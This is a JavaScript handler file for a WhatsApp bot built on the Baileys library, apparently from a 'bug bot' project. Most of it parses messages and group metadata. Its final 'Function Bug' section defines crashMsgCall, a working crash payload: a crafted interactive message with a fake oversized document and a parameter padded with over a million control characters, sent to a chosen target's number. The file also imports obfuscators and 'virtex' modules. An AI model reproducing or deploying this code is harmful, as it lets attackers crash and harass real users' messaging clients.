require('./system/settings');
const fs = require('fs');
const axios = require('axios');
const path = require('path');
const crypto = require('crypto');
const chalk = require("chalk");
const util = require("util");
const moment = require("moment-timezone");
const jsobfus = require('javascript-obfuscator');
const { deobfuscate } = require('obfuscator-io-deobfuscator');
const JsConfuser = require('js-confuser')
const { spawn, exec, execSync } = require('child_process');
const remini = require('./system/lib/memeks');
let accces = JSON.parse(fs.readFileSync('./system/database/access.json'));

const { default: baileys, proto, generateWAMessage, generateWAMessageFromContent, downloadAndSaveMediaMessage, getContentType, prepareWAMessageMedia } = require("@whiskeysockets/baileys");

module.exports = hamz = async (hamz, m, chatUpdate, store) => {
try {
// Message type handling
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);

const sender = m.key.fromMe
? hamz.user.id.split(":")[0] || hamz.user.id
: m.key.participant || m.key.remoteJid;

const senderNumber = sender.split('@')[0];
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() 
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");

// Database
const kontributor = JSON.parse(fs.readFileSync('./system/database/owner.json'));
const botNumber = await hamz.decodeJid(hamz.user.id);
const isBot = botNumber.includes(senderNumber)
const isOwner = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isAcces = accces.includes(sender)
/*const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();*/
const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted);

// Group function
const groupMetadata = isGroup ? await hamz.groupMetadata(m.chat).catch((e) => {}) : "";
const groupOwner = isGroup ? groupMetadata.owner : "";
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
// Function
const { smsg, sendGmail, formatSize, isUrl, generateMessageTag, getBuffer, getSizeMedia, runtime, fetchJson, sleep } = require('./system/lib/myfunction');

const { notif3 } = require("./system/virtex/notif3")
const { xnaf } = require('./system/virtex/xnaf')
const { buttonkal } = require('./system/virtex/buttonkal')
const TDX = fs.readFileSync("./system/virtex/tdx.jpg")
// Time
const time = moment.tz("Asia/Jakarta").format("HH:mm:ss");

// Console log
if (m.message) {
console.log('\x1b[30m--------------------\x1b[0m');
console.log(chalk.bgHex("#e74c3c").bold(`▢ XA Team Message`));
console.log(
chalk.bgHex("#00FF00").black(
` ⾐ Tanggal: ${new Date().toLocaleString()} \n` +
` ⾐ Pesan: ${m.body || m.mtype} \n` +
` ⾐ Pengirim: ${m.pushName} \n` +
` ⾐ JID: ${senderNumber}`
)
);
if (m.isGroup) {
console.log(
chalk.bgHex("#00FF00").black(
` ⾐ Grup: ${groupName} \n` +
` ⾐ GroupJid: ${m.chat}`
)
);
}
console.log();
}
//QONTED 
const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `XA Team By Hamz`,jpegThumbnail: ""}}}
const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝟑`}}}

// Function Bug
async function crashMsgCall(hamz, target) {
  hamz.relayMessage(target, {
    viewOnceMessage: {
        message: {
            interactiveMessage: {
                header: {
                    documentMessage: {
                        url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                        mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                        fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                        fileLength: "999999999",
                        pageCount: 0x9184e729fff,
                        mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                        fileName: "Fuck You",
                        fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                        directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                        mediaKeyTimestamp: "1715880173",
                        contactVcard: true
                    },
                    title: "Fuck",
                    hasMediaAttachment: true
                },
                body: {
                    text: "You"
                },
                nativeFlowMessage: {
                    buttons: [
                        {
                            name: 'call_permission_request',
                            buttonParamsJson: '{}'
                        }
                    ]
                },
                contextInfo: {
                    quotedMessage: {
                        interactiveResponseMessage: {
                            body: { 
                                text: "Sent", 
                                format: "DEFAULT" 
                            },
                            nativeFlowResponseMessage: {
                                name: "galaxy_message",
                                paramsJson: `{
                                    "screen_2_OptIn_0": true,
                                    "screen_2_OptIn_1": true,
                                    "screen_1_Dropdown_0": "HamzDev",
                                    "screen_1_DatePicker_1": "1028995200000",
                                    "screen_1_TextInput_2": "hamz@gmail.com",
                                    "screen_1_TextInput_3": "94643116",
                                    "screen_0_TextInput_0": "radio - buttons${"\u0003".repeat(1020000)}",
                                    "screen_0_TextInput_1": "Why?",
                                    "screen_0_Dropdown_2": "001-Grimgar",
                                    "screen_0_RadioButtonsGroup_3": "0_true",
                                    "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                }`,
                                version: 3
                            }
                        }
                    }
                }
            }
        }
    }
}, { participant: { jid: target } }, { messageId: null });
}